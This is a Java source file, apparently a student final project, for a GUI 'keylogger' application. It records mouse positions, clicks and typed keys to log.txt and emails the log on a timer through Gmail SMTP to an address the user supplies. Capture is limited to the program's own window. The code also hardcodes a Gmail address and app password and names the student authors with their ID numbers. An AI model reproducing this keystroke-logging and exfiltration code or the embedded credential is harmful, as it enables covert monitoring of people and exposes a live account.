//Final Projesi - Keylogger Uygulaması
//Mervenur Saraç - 22120205055
//Hilal Nur Albayrak - 22120205056

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.util.*;
import java.util.Timer;
import java.util.TimerTask;
import javax.mail.*;
import javax.mail.internet.*;

class Dosya {
    //Dosyanın boyutunu kontrol edebilmek için değişkenler ve dışardan boyutu alabilmek için setter
    int mbBoyut = 1;
    public void setMbBoyut(int mbBoyut) {
        this.mbBoyut = mbBoyut;
    }
    private final long MAX_BOYUT =  mbBoyut * 1024 * 1024;
    String dosyaAdi = "log.txt";
    File dosya = new File(dosyaAdi);
    public void olustur() {
        if (dosyaMevcut(dosyaAdi)) {
            // Dosya mevcut
        } else {
            try {
                dosya.createNewFile();
                //Dosya oluşturuldu
            } catch (IOException e) {
                System.out.println("Dosya oluşturulurken bir hata oluştu: " + e.getMessage());
            }
        }
    }

    //Dosyanın mevcutluğunu kontrol edip boolean dönen metot
    public static boolean dosyaMevcut(String dosyaAdi) {
        File dosya = new File(dosyaAdi);
        return dosya.exists();
    }

    //Dosya büyüklüğü istenilen maksimum boyutu aşıp aşmadığını kontrol eden metot
    public void dosyaKontrol() {
        if (dosya.length() >= MAX_BOYUT) {
            try (FileWriter fileWriter = new FileWriter(dosyaAdi, false)) {
                fileWriter.write("");
                System.out.println(dosyaAdi + " dosyası boşaltıldı.");
            } catch (IOException e) {
                System.out.println("Dosya boşaltılırken bir hata oluştu: " + e.getMessage());
            }
        }
    }
}

class Mail{
    String emailAlan = "";    //Maili alan kişinin bilgileri

    //Gönderen kişinin bilgileri
    String email = "hlllbyrk03@gmail.com";
    String sifre = "kmlhtskbihyzisbo"; //iki adımda doğrulama ile alınan uygulama şifresi

    // Kullanici kimlik bilgileri
    Authenticator dogrulama = new Authenticator() {
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(email, sifre);
        }
    };
}

class MailGonder extends Mail{
    public void MailAt(String mailAdresi){
        emailAlan = mailAdresi;
        Scanner input = new Scanner(System.in);

        //E-posta ayarları
        String host = "smtp.gmail.com";
        Properties ozellik = new Properties();
        ozellik.put("mail.smtp.host", host);
        ozellik.put("mail.smtp.port", "587");
        ozellik.put("mail.smtp.starttls.enable", "true");
        ozellik.put("mail.smtp.auth", "true");

        String dosyaYolu = "log.txt";

        //Yeni protokol
        ozellik.setProperty("mail.smtp.ssl.protocols","TLSv1.2");

        //SMTP sunucusuna bağlanmak ve e-posta göndermek için gerekli olan oturum nesnesi
        Session oturum = Session.getInstance(ozellik, dogrulama);

        //Mail bilgilerini al
        String konu = "Final Projesi";
        String icerik = "deneme";

        try {
            // MimeMessage nesnesi olustur
            MimeMessage mesaj = new MimeMessage(oturum);

            // Gönderen kişi, Maili alan kişi bilgileri
            mesaj.setFrom(new InternetAddress(email));
            mesaj.addRecipient(Message.RecipientType.TO, new InternetAddress(emailAlan));

            //Konu
            mesaj.setSubject(konu);

            // Mail icerigi
            mesaj.setText(icerik);

            MimeBodyPart icerikPart = new MimeBodyPart();
            icerikPart.setText(icerik);

            MimeBodyPart dosyaPart = new MimeBodyPart();
            dosyaPart.attachFile(dosyaYolu);

            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(icerikPart);
            multipart.addBodyPart(dosyaPart);

            mesaj.setContent(multipart);

            // Maili gönder
            Transport.send(mesaj);
        } catch (MessagingException mex) {
            mex.printStackTrace();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}

class Uygulama extends Frame{
    //Kullanılacak özelliklerin eklenmesi
    JFrame frame = new JFrame();
    JLabel lblSure, lblMail, lblBoyut1;
    JButton bttnStart, bttnStop;
    JTextField textSure, textMail, textBoyut2;
    JRadioButton rbMouse, rbKeyboard, rbBoth;
    ButtonGroup buttonGroup;
    Timer timer;
    TimerTask timerTask;
    public void Arayuz(){
        //Dizaynın belirlenmesi
        frame.setTitle("Final Projesi - Keylogger Uygulaması");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setResizable(false);

        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        int x = screenSize.width / 2, y = screenSize.height / 2;
        frame.setBounds(x - 700 / 2, y - 400 / 2, 700, 400);
        frame.getContentPane().setLayout(null);

        bttnStart = new JButton("Başlat");
        bttnStart.setBounds(175,250,100,50);
        frame.add(bttnStart);

        bttnStop = new JButton("Durdur");
        bttnStop.setBounds(300,250,100,50);
        frame.add(bttnStop);

        lblSure = new JLabel("Mail gönderme aralıkları (dk):");
        lblSure.setBounds(50, 30, 200, 50);
        lblSure.setHorizontalAlignment(SwingConstants.CENTER);
        frame.add(lblSure);

        lblMail = new JLabel("Gönderilecek mail hesabı:");
        lblMail.setBounds(50, 80, 200, 50);
        lblMail.setHorizontalAlignment(SwingConstants.CENTER);
        frame.add(lblMail);

        lblBoyut1 = new JLabel("Max log file boyutu(MB):");
        lblBoyut1.setBounds(50, 130, 200, 50);
        lblBoyut1.setHorizontalAlignment(SwingConstants.CENTER);
        frame.add(lblBoyut1);

        textSure = new JTextField();
        textSure.setBounds(250,40,180,30);
        frame.add(textSure);

        textMail = new JTextField();
        textMail.setBounds(250,90,180,30);
        frame.add(textMail);

        textBoyut2 = new JTextField();  //gmail maks dosya boyutu
        textBoyut2.setBounds(250, 140, 180, 30);
        frame.add(textBoyut2);

        rbMouse = new JRadioButton("Sadece Fare");
        rbMouse.setBounds(450, 30, 200, 50);
        frame.add(rbMouse);

        rbKeyboard = new JRadioButton("Sadece Klavye");
        rbKeyboard.setBounds(450, 80, 200, 50);
        frame.add(rbKeyboard);

        rbBoth = new JRadioButton("Her İkisi");
        rbBoth.setBounds(450, 130, 200, 50);
        frame.add(rbBoth);

        buttonGroup = new ButtonGroup();
        buttonGroup.add(rbMouse);
        buttonGroup.add(rbKeyboard);
        buttonGroup.add(rbBoth);

        //Butonlara listenerların eklenmesi
        bttnStart.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                baslatButonuAction();
            }
        });

        bttnStop.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                durdurButonuAction();
            }
        });

        frame.setVisible(true);
    }

    //Başlat butonuna basıldığında çalışacak method
    public void baslatButonuAction() {
        // Dosya ve MailGonder classları için
        Dosya dosya = new Dosya();
        dosya.olustur();
        MailGonder mailNesnesi = new MailGonder();

        // boyut kontolü
        int boyut = Integer.parseInt(textBoyut2.getText());
        if(boyut >= 25){
            JOptionPane.showMessageDialog(null, "Dosya boyutu maksimum boyutu aşmaktadır. Lütfen daha küçük bir değer giriniz.", "Uyarı", JOptionPane.WARNING_MESSAGE);
            textBoyut2.setText("");
            boyut = 0;
        }else{
            dosya.setMbBoyut(boyut);
        }
        // textField'lardan bilgi alımı
        String sure = textSure.getText();
        String mail = textMail.getText();
        String secim = "";

        if (rbMouse.isSelected()) {
            secim = "fare";
        } else if (rbKeyboard.isSelected()) {
            secim = "klavye" ;
        } else if (rbBoth.isSelected()) {
            secim = "ikisi";
        }
        // alınan bilgiler kontrol edilir eksik bilgi yoksa program çalışır
        if (sure.isEmpty() || mail.isEmpty() || secim.isEmpty() || boyut == 0) {
            JOptionPane.showMessageDialog(null, "Lütfen tüm bilgileri doldurun.", "Uyarı", JOptionPane.WARNING_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(null, "Uygulama başlatıldı.", "Bilgi", JOptionPane.INFORMATION_MESSAGE);
            int sureDk = Integer.parseInt(sure);
            if(rbMouse.isSelected()){
                // sadece fare radiobutton seçilmişse çalışacak olan kısım
                frame.addMouseMotionListener(new MouseMotionAdapter() {
                    @Override
                    public void mouseMoved(MouseEvent e) {
                        int x = e.getX();
                        int y = e.getY();
                        // alınan konumların dosyaya yazdırılması
                        try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                            writer.write("Mouse pointer location: " +
                                    "x = " + x + ", y = " + y);
                            writer.newLine();
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                });
                frame.addMouseListener(new MouseAdapter() {
                    // farenin tuş hareketlerinin kontrolü
                    @Override
                    public void mouseClicked(MouseEvent k) {
                        if (SwingUtilities.isLeftMouseButton(k)) {
                            // Sol tıklandığında
                            try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                                writer.write("Left clicked.");
                                writer.newLine();
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        } else if (SwingUtilities.isRightMouseButton(k)) {
                            // Sağ tıklandığında
                            try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                                writer.write("Right clicked.");
                                writer.newLine();
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        } else if (SwingUtilities.isMiddleMouseButton(k)) {
                            // Orta tıklandığında
                            try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                                writer.write("Wheel clicked.");
                                writer.newLine();
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }
                });
            } else if(rbKeyboard.isSelected()) {
                //klavye takibi
                KeyAdapter keyAdapter = new KeyAdapter() {
                    @Override
                    public void keyTyped(KeyEvent l) {
                        super.keyTyped(l);
                        char karakter = l.getKeyChar();
                        try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                            writer.write("key pressed" + karakter);
                            writer.newLine();
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                };
                frame.addKeyListener(keyAdapter);
                frame.requestFocus();
            } else {
                frame.addMouseMotionListener(new MouseMotionAdapter() {
                    @Override
                    public void mouseMoved(MouseEvent e) {
                        int x = e.getX();
                        int y = e.getY();
                        try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                            writer.write("Mouse pointer location: " +
                                    "x = " + x + ", y = " + y);
                            writer.newLine();
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                });
                frame.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent k) {
                        if (SwingUtilities.isLeftMouseButton(k)) {
                            // Sol tıklandığında
                            try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                                writer.write("Left clicked.");
                                writer.newLine();
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        } else if (SwingUtilities.isRightMouseButton(k)) {
                            // Sağ tıklandığında
                            try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                                writer.write("Right clicked.");
                                writer.newLine();
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        } else if (SwingUtilities.isMiddleMouseButton(k)) {
                            // Orta tıklandığında
                            try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                                writer.write("Wheel clicked.");
                                writer.newLine();
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }
                });
                KeyAdapter keyAdapter = new KeyAdapter() {
                    @Override
                    public void keyTyped(KeyEvent l) {
                        super.keyTyped(l);
                        char karakter = l.getKeyChar();
                        try (BufferedWriter writer = new BufferedWriter(new FileWriter("log.txt", true))) {
                            writer.write("key pressed" + karakter);
                            writer.newLine();
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                };
                frame.addKeyListener(keyAdapter);
                frame.requestFocus();
            }
            // belirlenen süre içinde çalışmasını sağlayan kısım
            timer = new Timer();
            timerTask = new TimerTask() {
                @Override
                public void run() {
                    Dosya nesne = new Dosya();
                    nesne.dosyaKontrol();
                    mailNesnesi.MailAt(mail);
                }
            };

            timer.schedule(timerTask, 0, (long) sureDk * 60 * 1000);
        }
    }

    //çaalışmayı durduracak olan method
    public void durdurButonuAction() {
        JOptionPane.showMessageDialog(null, "Uygulama durduruldu.", "Bilgi", JOptionPane.INFORMATION_MESSAGE);
        if(rbMouse.isSelected()){
            // Listener'ı durduran kısım
            frame.removeMouseMotionListener(frame.getMouseMotionListeners()[0]);
            frame.removeMouseListener(frame.getMouseListeners()[0]);
        }else if(rbKeyboard.isSelected()){
            //klavye takibini durduran kısım
            for (KeyListener listener : frame.getKeyListeners()) {
                if (listener instanceof KeyAdapter) {
                    frame.removeKeyListener(listener);
                    break;
                }
            }
        }else if(rbBoth.isSelected()){
            frame.removeMouseMotionListener(frame.getMouseMotionListeners()[0]);
            frame.removeMouseListener(frame.getMouseListeners()[0]);
            for (KeyListener listener : frame.getKeyListeners()) {
                if (listener instanceof KeyAdapter) {
                    frame.removeKeyListener(listener);
                    break;
                }
            }
        }
        // zamanı durduran kısım
        if (timer != null) {
            timer.cancel();
            timer.purge();
        }
    }
}

public class Main {
    public static void main(String[] args) {
        // uygulamayı çağırmak için oluşturulan nesne
        Uygulama app = new Uygulama();
        app.Arayuz();
    }
}
